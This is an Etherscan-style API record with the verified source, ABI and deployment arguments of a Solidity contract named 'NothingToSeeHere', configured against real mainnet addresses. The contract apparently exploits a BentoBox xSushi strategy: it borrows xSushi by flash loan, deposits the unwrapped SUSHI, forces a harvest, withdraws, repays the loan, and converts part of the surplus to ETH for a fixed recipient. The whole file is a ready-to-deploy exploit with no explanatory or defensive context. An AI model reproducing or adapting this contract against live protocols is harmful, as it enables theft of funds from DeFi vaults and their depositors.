{"status":"1","message":"OK","result":[{"SourceCode":"{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/NothingToSeeHere.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n\\npragma solidity >=0.8.0;\\n\\ncontract NothingToSeeHere {\\n\\t\\n\\tIBentoBoxMinimal public immutable bentoBox;\\n\\tIERC20 public immutable sushi;\\n\\tIWETH immutable weth;\\n\\tIXSushi public immutable xSushi;\\n\\tIXSushiStrategy public immutable xSushiStrategy;\\n\\tIPair public immutable xSushiWethLp;\\n\\taddress public immutable recipient;\\n\\n    constructor(\\n\\t\\tIBentoBoxMinimal _bentoBox,\\n\\t\\tIERC20 _sushi,\\n\\t\\tIWETH _weth,\\n\\t\\tIXSushi _xSushi,\\n\\t\\tIXSushiStrategy _xSushiStrategy,\\n\\t\\tIPair _xSushiWethLp,\\n\\t\\taddress _recipient\\n\\t) {\\n\\t\\tbentoBox = _bentoBox;\\n\\t\\tsushi = _sushi;\\n\\t\\tweth = _weth;\\n\\t\\txSushiWethLp = _xSushiWethLp;\\n\\t\\txSushi = _xSushi;\\n\\t\\txSushiStrategy = _xSushiStrategy;\\n\\t\\trecipient = _recipient;\\n\\t\\t_xSushi.approve(address(_xSushiStrategy), type(uint256).max);\\n\\t\\t_sushi.approve(address(_xSushi), type(uint256).max);\\n\\t\\t_sushi.approve(address(_bentoBox), type(uint256).max);\\n\\t}\\n\\n\\tfunction execute(uint256 amount) public {\\n\\t\\trequire(msg.sender == recipient);\\n\\t\\tbentoBox.flashLoan(address(this), address(this), address(xSushi), amount, \\\"\\\");\\n\\t}\\n\\n\\tfunction onFlashLoan(address, address, uint256 amount, uint256 fee, bytes memory) public {\\n\\t\\txSushi.leave(amount);\\n\\t\\tuint256 availableSushi = sushi.balanceOf(address(this));\\n\\t\\t(, uint256 shareOut) = bentoBox.deposit(address(sushi), address(this), address(this), availableSushi, 0);\\n        bentoBox.harvest(address(sushi), false, 0);\\n\\t\\tbentoBox.withdraw(address(sushi), address(this), address(this), 0, shareOut);\\n\\t\\txSushi.enter(sushi.balanceOf(address(this)));\\n\\t\\txSushi.transfer(address(bentoBox), amount + fee);\\n\\t\\tuint256 profit = xSushi.balanceOf(address(this)) / 3;\\n\\t\\tuint256 amountOut = getAmountOut(profit);\\n\\t\\txSushi.transfer(address(xSushiWethLp), profit);\\n\\t\\txSushiWethLp.swap(0, amountOut, address(this), \\\"\\\");\\n\\t\\tweth.withdraw(amountOut);\\n\\t\\trecipient.call{value: address(this).balance}(\\\"\\\");\\n\\t\\txSushi.transfer(address(xSushiStrategy), xSushi.balanceOf(address(this)));\\n\\t\\tbentoBox.harvest(address(sushi), false, 0);\\n\\t}\\n    \\n\\tfunction getAmountOut(uint256 amountIn) internal view returns (uint256 amountOut) {\\n        uint256 reserveIn = xSushi.balanceOf(address(xSushiWethLp));\\n        uint256 reserveOut = weth.balanceOf(address(xSushiWethLp));\\n\\t\\tuint256 amountInWithFee = amountIn * 997;\\n        uint256 numerator = amountInWithFee * reserveOut;\\n        uint256 denominator = reserveIn * 1000 + amountInWithFee;\\n        amountOut = numerator / denominator;\\n    }\\n\\n\\treceive() payable external {}\\n\\n}\\n\\ninterface IPair {\\n\\tfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\\n}\\n\\n/// @notice Minimal BentoBox vault interface. \\n/// @dev `token` is aliased as `address` from `IERC20` for simplicity.\\ninterface IBentoBoxMinimal {\\n    struct Rebase {\\n        uint128 elastic;\\n        uint128 base;\\n    }\\n    /// @notice Balance per ERC-20 token per account in shares.\\n    function balanceOf(address, address) external view returns (uint256);\\n    \\n    /// @dev Helper function to represent an `amount` of `token` in shares.\\n    /// @param token The ERC-20 token.\\n    /// @param amount The `token` amount.\\n    /// @param roundUp If the result `share` should be rounded up.\\n    /// @return share The token amount represented in shares.\\n    function toShare(\\n        address token,\\n        uint256 amount,\\n        bool roundUp\\n    ) external view returns (uint256 share);\\n    \\n    /// @dev Helper function to represent shares back into the `token` amount.\\n    /// @param token The ERC-20 token.\\n    /// @param share The amount of shares.\\n    /// @param roundUp If the result should be rounded up.\\n    /// @return amount The share amount back into native representation.\\n    function toAmount(\\n        address token,\\n        uint256 share,\\n        bool roundUp\\n    ) external view returns (uint256 amount);\\n    \\n    /// @notice Registers this contract so that users can approve it for BentoBox.\\n    function registerProtocol() external;\\n\\n    /// @notice Deposit an amount of `token` represented in either `amount` or `share`.\\n    /// @param token_ The ERC-20 token to deposit.\\n    /// @param from which account to pull the tokens.\\n    /// @param to which account to push the tokens.\\n    /// @param amount Token amount in native representation to deposit.\\n    /// @param share Token amount represented in shares to deposit. Takes precedence over `amount`.\\n    /// @return amountOut The amount deposited.\\n    /// @return shareOut The deposited amount repesented in shares.\\n    function deposit(\\n        address token_,\\n        address from,\\n        address to,\\n        uint256 amount,\\n        uint256 share\\n    ) external payable returns (uint256 amountOut, uint256 shareOut);\\n\\n    /// @notice Withdraws an amount of `token` from a user account.\\n    /// @param token_ The ERC-20 token to withdraw.\\n    /// @param from which user to pull the tokens.\\n    /// @param to which user to push the tokens.\\n    /// @param amount of tokens. Either one of `amount` or `share` needs to be supplied.\\n    /// @param share Like above, but `share` takes precedence over `amount`.\\n    function withdraw(\\n        address token_,\\n        address from,\\n        address to,\\n        uint256 amount,\\n        uint256 share\\n    ) external returns (uint256 amountOut, uint256 shareOut);\\n\\n    /// @notice Transfer shares from a user account to another one.\\n    /// @param token The ERC-20 token to transfer.\\n    /// @param from which user to pull the tokens.\\n    /// @param to which user to push the tokens.\\n    /// @param share The amount of `token` in shares.\\n    function transfer(\\n        address token,\\n        address from,\\n        address to,\\n        uint256 share\\n    ) external;\\n\\n    function flashLoan(\\n        address borrower,\\n        address receiver,\\n        address token,\\n        uint256 amount,\\n        bytes calldata data\\n    ) external;\\n\\n    function totals(address) external returns(Rebase memory);\\n\\n    function harvest(\\n        address token,\\n        bool balance,\\n        uint256 maxChangeAmount\\n    ) external;\\n}\\n\\ninterface IERC20 {\\n    function totalSupply() external view returns (uint256);\\n    function balanceOf(address account) external view returns (uint256);\\n    function allowance(address owner, address spender) external view returns (uint256);\\n    function approve(address spender, uint256 amount) external returns (bool);\\n    function decimals() external view returns (uint256);\\n\\tfunction transferFrom(address, address, uint256) external;\\n\\tfunction transfer(address, uint256) external;\\n}\\n\\ninterface IWETH is IERC20{\\n\\tfunction withdraw(uint) external;\\n}\\n\\ninterface IXSushiStrategy {\\n    function skim(uint256) external;\\n}\\ninterface IXSushi is IERC20 {\\n    function enter(uint256) external;\\n    function leave(uint256) external;\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"metadata\": {\r\n      \"useLiteralContent\": true\r\n    },\r\n    \"libraries\": {\r\n      \"\": {\r\n        \"__CACHE_BREAKER__\": \"0x00000000d41867734bbee4c6863d9255b2b06ac1\"\r\n      }\r\n    }\r\n  }\r\n}}","ABI":"[{\"inputs\":[{\"internalType\":\"contract IBentoBoxMinimal\",\"name\":\"_bentoBox\",\"type\":\"address\"},{\"internalType\":\"contract IERC20\",\"name\":\"_sushi\",\"type\":\"address\"},{\"internalType\":\"contract IWETH\",\"name\":\"_weth\",\"type\":\"address\"},{\"internalType\":\"contract IXSushi\",\"name\":\"_xSushi\",\"type\":\"address\"},{\"internalType\":\"contract IXSushiStrategy\",\"name\":\"_xSushiStrategy\",\"type\":\"address\"},{\"internalType\":\"contract IPair\",\"name\":\"_xSushiWethLp\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_recipient\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"bentoBox\",\"outputs\":[{\"internalType\":\"contract IBentoBoxMinimal\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"execute\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"fee\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"\",\"type\":\"bytes\"}],\"name\":\"onFlashLoan\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"recipient\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sushi\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"xSushi\",\"outputs\":[{\"internalType\":\"contract IXSushi\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"xSushiStrategy\",\"outputs\":[{\"internalType\":\"contract IXSushiStrategy\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"xSushiWethLp\",\"outputs\":[{\"internalType\":\"contract IPair\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]","ContractName":"NothingToSeeHere","CompilerVersion":"v0.8.7+commit.e28d00a7","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"000000000000000000000000f5bce5077908a1b7370b9ae04adc565ebd6439660000000000000000000000006b3595068778dd592e39a122f4f5a5cf09c90fe2000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000008798249c2e607446efb7ad49ec89dd1865ff4272000000000000000000000000afd3f19e0470d4e4cd4aa5aa699915838a79ab6b00000000000000000000000036e2fcccc59e5747ff63a03ea2e5c0c2c14911e70000000000000000000000000cc7090d567f902f50cb5621a7d6a59874364ba1","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"ipfs://bf454deeabc2f8d679952baeaf3232ea435509f0bc4d806f9c690f30121dd283"}]}